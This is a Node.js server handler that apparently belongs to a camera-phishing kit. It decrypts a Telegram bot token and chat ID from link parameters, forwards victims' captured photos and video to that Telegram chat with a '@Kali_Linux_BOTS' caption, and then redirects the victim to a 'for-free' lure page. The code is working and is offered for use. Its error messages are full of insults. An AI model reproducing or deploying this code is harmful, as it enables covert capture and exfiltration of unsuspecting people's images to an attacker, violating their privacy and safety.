const axios = require('axios');
const crypto = require('crypto');

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY; // Must be 32 bytes (256 bits)
const IV = '1234567890123456'; // Must match the IV in created.js (16 bytes)

if (!ENCRYPTION_KEY) {
  console.error('Missing ENCRYPTION_KEY environment variable, you dumb fuck');
  process.exit(1);
}

// AES Decryption Function
function decrypt(encryptedText) {
  try {
    const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), Buffer.from(IV, 'utf8'));
    let decrypted = decipher.update(encryptedText, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (error) {
    console.error('Decryption failed:', error);
    throw new Error('Invalid encrypted data');
  }
}

module.exports = async (req, res) => {
  try {
    if (req.method !== 'POST') {
      console.log('Invalid method:', req.method);
      return res.status(405).json({ ok: false, error: 'Method not allowed, you dumb fuck' });
    }

    const { x, y, photos, video } = req.body;

    if (!x || !y || !photos || !video) {
      console.log('Missing required fields in request body');
      return res.status(400).json({ ok: false, error: 'Missing required fields, you fucking idiot' });
    }

    // Decrypt the AES-encrypted parameters
    let botToken, chatId;
    try {
      botToken = decrypt(x);
      chatId = decrypt(y);
    } catch (error) {
      console.error('Error decrypting URL parameters, you moron:', error);
      return res.status(400).json({ ok: false, error: 'Invalid URL parameters, you fuck' });
    }

    if (!/^\d+$/.test(chatId)) {
      console.log('Invalid chat ID:', chatId);
      return res.status(400).json({ ok: false, error: 'Invalid chat ID, you piece of shit' });
    }

    // Send photos to Telegram
    for (let i = 0; i < photos.length; i++) {
      const formDataPhoto = new FormData();
      formDataPhoto.append('chat_id', chatId);
      formDataPhoto.append('photo', Buffer.from(photos[i], 'base64'), `photo${i + 1}.jpg`);
      formDataPhoto.append('caption', '⚡Join ➣ @Kali_Linux_BOTS');

      try {
        const responsePhoto = await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, formDataPhoto, {
          headers: formDataPhoto.getHeaders(),
        });
        if (!responsePhoto.data.ok) {
          throw new Error(`Failed to send photo ${i + 1}: ${responsePhoto.data.description || 'Unknown error'}`);
        }
        console.log(`Photo ${i + 1} sent successfully`);
      } catch (error) {
        console.error('Error sending photo, motherfucker:', error.message);
        return res.status(500).json({ ok: false, error: 'Failed to send photo, you piece of shit' });
      }
    }

    // Send video to Telegram
    const formDataVideo = new FormData();
    formDataVideo.append('chat_id', chatId);
    formDataVideo.append('video', Buffer.from(video, 'base64'), 'video.mp4');
    formDataVideo.append('caption', '⚡Join ➣ @Kali_Linux_BOTS');

    try {
      const responseVideo = await axios.post(`https://api.telegram.org/bot${botToken}/sendVideo`, formDataVideo, {
        headers: formDataVideo.getHeaders(),
      });
      if (!responseVideo.data.ok) {
        throw new Error(`Failed to send video: ${responseVideo.data.description || 'Unknown error'}`);
      }
      console.log('Video sent successfully');
      res.status(200).json({ ok: true, redirect: `https://for-free.serv00.net/2/?id=${chatId}` });
    } catch (error) {
      console.error('Error sending video, you fucking asshole:', error.message);
      res.status(500).json({ ok: false, error: 'Failed to send video, you goddamn moron' });
    }
  } catch (error) {
    console.error('Error in sendMedia, you clumsy fuck:', error);
    res.status(500).json({ ok: false, error: 'Server fucked up, try again' });
  }
};
